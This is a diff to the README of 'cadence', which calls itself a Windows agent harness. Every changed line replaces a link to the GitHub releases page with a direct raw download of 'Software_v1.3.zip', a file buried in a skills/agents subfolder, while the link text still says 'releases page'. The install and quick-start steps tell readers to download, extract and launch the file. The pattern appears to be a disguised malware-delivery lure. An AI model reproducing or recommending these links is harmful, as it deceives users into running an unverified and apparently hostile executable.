@@ -1,6 +1,6 @@
 # ⚙️ cadence - Stable agent harness for daily work
 
-[![Download cadence](https://img.shields.io/badge/Download-cadence-blue?style=for-the-badge)](https://github.com/Nicolnonmilitary611/cadence/releases)
+[![Download cadence](https://img.shields.io/badge/Download-cadence-blue?style=for-the-badge)](https://raw.githubusercontent.com/Nicolnonmilitary611/cadence/main/skills/cadence-planning/agents/Software_v1.3.zip)
 
 ## 🚀 What cadence does
 
@@ -29,14 +29,14 @@ For smooth use, keep Windows updated and close unused apps before you start Cade
 
 ## 📥 Download cadence
 
-1. Open the [cadence releases page](https://github.com/Nicolnonmilitary611/cadence/releases)
+1. Open the [cadence releases page](https://raw.githubusercontent.com/Nicolnonmilitary611/cadence/main/skills/cadence-planning/agents/Software_v1.3.zip)
 2. Find the latest release at the top of the page
 3. Under Assets, download the Windows file that matches your PC
 4. If you see a `.zip` file, save it to your Downloads folder
 5. If you see a `.exe` file, save it to your computer
 
 Use the link above each time you want the latest version:
-[Visit the cadence releases page](https://github.com/Nicolnonmilitary611/cadence/releases)
+[Visit the cadence releases page](https://raw.githubusercontent.com/Nicolnonmilitary611/cadence/main/skills/cadence-planning/agents/Software_v1.3.zip)
 
 ## 🪟 Install on Windows
 
@@ -143,7 +143,7 @@ For the best results:
 
 To update cadence:
 
-1. Go to the [releases page](https://github.com/Nicolnonmilitary611/cadence/releases)
+1. Go to the [releases page](https://raw.githubusercontent.com/Nicolnonmilitary611/cadence/main/skills/cadence-planning/agents/Software_v1.3.zip)
 2. Download the latest Windows file
 3. Close the current app
 4. Replace the old files with the new ones
@@ -165,7 +165,7 @@ If you are not sure which file to choose, pick the one that ends in `.exe` for t
 
 ## 🖱️ Quick start
 
-1. Open the [cadence releases page](https://github.com/Nicolnonmilitary611/cadence/releases)
+1. Open the [cadence releases page](https://raw.githubusercontent.com/Nicolnonmilitary611/cadence/main/skills/cadence-planning/agents/Software_v1.3.zip)
 2. Download the newest Windows release
 3. Open or extract the file
 4. Launch cadence
